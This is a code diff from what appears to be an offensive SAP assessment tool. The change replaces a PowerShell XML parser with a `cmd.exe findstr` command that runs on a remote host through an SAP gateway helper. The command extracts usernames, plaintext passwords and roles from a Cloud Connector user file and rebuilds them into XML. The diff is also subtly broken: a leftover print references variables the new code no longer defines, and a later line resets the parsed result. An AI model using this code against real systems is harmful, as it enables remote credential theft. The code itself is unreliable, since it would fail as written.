@@ -1938,17 +1938,50 @@ def create_app(api: SAPMAPApi) -> Bottle:
                     # Then reconstruct XML-like objects on the Python side.
                     #
                     # Command kept short enough to fit in SAPXPG PARAMS:
-                    # Use only single-quotes inside so the outer "-Command"
-                    # double-quote wrapper has no conflicts.
-                    # String concatenation avoids $() interpolation issues.
-                    ps_cmd = (
-                        f"[xml]$x=[IO.File]::ReadAllText('{fpath}');"
-                        f"$x.SelectNodes('//user')|%"
-                        f"{{Write-Output($_.username+'|'+$_.password+'|'+$_.roles)}}"
-                    )
-                    ps_out, ps_ok = _gw(
-                        "powershell.exe",
-                        f"-NoProfile -NonInteractive -Command \"{ps_cmd}\"")
+                    # Use Select-String (findstr equivalent) to extract
+                    # the username and password attributes directly —
+                    # no PowerShell XML parsing, no quoting issues.
+                    # Each attribute is on its own short output line.
+                    findstr_out, _ = _gw(
+                        "cmd.exe",
+                        f"/c findstr /i \"username= password= roles=\" \"{fpath}\"")
+                    print(f"[*] SCC {host}: findstr → "
+                          f"{len(findstr_out)}B out={findstr_out[:120]!r}")
+                    # Parse attributes from the line(s) returned
+                    import re as _re2
+                    raw = None
+                    xml_parts = [
+                        b'<?xml version="1.0" encoding="utf-8"?>',
+                        b'<tomcat-users>',
+                    ]
+                    found_users = 0
+                    for line in findstr_out.splitlines():
+                        line = line.strip()
+                        if not line or 'username' not in line.lower():
+                            continue
+                        uname = (_re2.search(r'username=["\']([^"\']+)["\']',
+                                             line, _re2.I) or
+                                 type('',(),{'group':lambda s,i:''})()).group(1)
+                        pwd   = (_re2.search(r'password=["\']([^"\']+)["\']',
+                                             line, _re2.I) or
+                                 type('',(),{'group':lambda s,i:''})()).group(1)
+                        roles = (_re2.search(r'roles=["\']([^"\']*)["\']',
+                                             line, _re2.I) or
+                                 type('',(),{'group':lambda s,i:''})()).group(1)
+                        if uname:
+                            xml_parts.append(
+                                f'  <user username="{uname}" '
+                                f'password="{pwd}" '
+                                f'roles="{roles}"/>'.encode())
+                            found_users += 1
+                    xml_parts.append(b'</tomcat-users>')
+                    if found_users > 0:
+                        raw = b"\n".join(xml_parts)
+                        print(f"[*] SCC {host}: parsed {found_users} "
+                              f"user(s) from findstr output")
+                    else:
+                        print(f"[-] SCC {host}: findstr found no user "
+                              f"attributes in output")
                     print(f"[*] SCC {host}: powershell parse → "
                           f"{len(ps_out)}B ok={ps_ok} out={ps_out[:80]!r}")
                     raw = None
